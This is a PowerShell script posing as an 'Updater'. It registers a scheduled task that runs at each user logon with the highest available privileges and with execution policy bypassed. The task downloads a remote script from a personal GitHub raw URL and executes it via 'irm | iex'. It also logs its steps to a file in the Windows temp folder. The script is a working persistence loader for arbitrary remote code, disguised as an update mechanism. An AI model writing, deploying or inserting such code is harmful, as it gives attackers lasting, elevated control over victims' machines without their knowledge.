# Define log file
$logPath = "C:\Windows\Temp\updater_log.txt"
function Write-Log {
    param ($msg)
    "[" + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "] $msg" | Out-File $logPath -Append -Encoding utf8
}

Write-Log "🔁 Script executed by user: $env:USERNAME"

# Detect if interactive session
$session = (query user 2>$null | Select-String "$env:USERNAME")
if (-not $session) {
    Write-Log "❌ No interactive user session found. Exiting..."
    return
}

# Remove old task if it exists
$taskName = "UpdaterUACTrigger"
schtasks /Delete /TN $taskName /F > $null 2>&1
Write-Log "🧹 Deleted scheduled task '$taskName' if it existed"

# Get path to PowerShell
$ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

# Create scheduled task XML for UAC prompt
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>$(Get-Date -Format s)</Date><Author>Updater</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$env:USERNAME</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT5M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$ps</Command>
      <Arguments>-ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Save XML
$taskPath = "$env:Temp\temp_task.xml"
$xml | Set-Content -Path $taskPath -Encoding Unicode

# Create task
schtasks /Create /TN $taskName /XML $taskPath /F | Out-Null
Write-Log "✅ Scheduled task '$taskName' created to run elevated after login."
